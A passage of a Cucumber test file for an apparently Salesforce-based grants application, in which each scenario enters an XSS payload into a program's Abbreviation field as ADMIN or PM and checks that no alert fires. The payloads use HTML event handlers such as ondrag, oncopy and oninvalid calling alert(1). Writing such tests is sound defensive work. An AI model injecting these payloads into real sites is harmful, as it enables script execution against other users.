      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300766 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                         | Field                |
      | <dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300767 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                        | Field                |
      | <xss oncontextmenu="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300769 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                          | Field                |
      | <xss oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300770 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                         | Field                |
      | <xss oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300772 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                          | Field                |
      | <xss ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300774 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                  | Field                |
      | <xss draggable="true" ondrag="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300794 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                     | Field                |
      | <xss draggable="true" ondragend="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300804 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                       | Field                |
      | <xss draggable="true" ondragenter="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300808 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                       | Field                |
      | <xss draggable="true" ondragleave="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300809 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                           | Field                |
      | <div draggable="true" contenteditable>drag me</div><xss ondragover=alert(1) contenteditable style=display:block>drop here</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300810 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                       | Field                |
      | <xss draggable="true" ondragstart="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300811 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                       | Field                |
      | <div draggable="true" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable style=display:block>drop here</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300812 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                             | Field                |
      | <xss onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</xss><input value=clickme> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300813 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                           | Field                |
      | <video onfullscreenchange=alert(1) src=validvideo.mp4 controls> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300815 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                              | Field                |
      | <input oninput=alert(1) value=xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300836 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                        | Field                |
      | <form><input oninvalid=alert(1) required><input type=submit> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300837 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                    | Field                |
      | <xss onkeydown="alert(1)" contenteditable style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300838 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
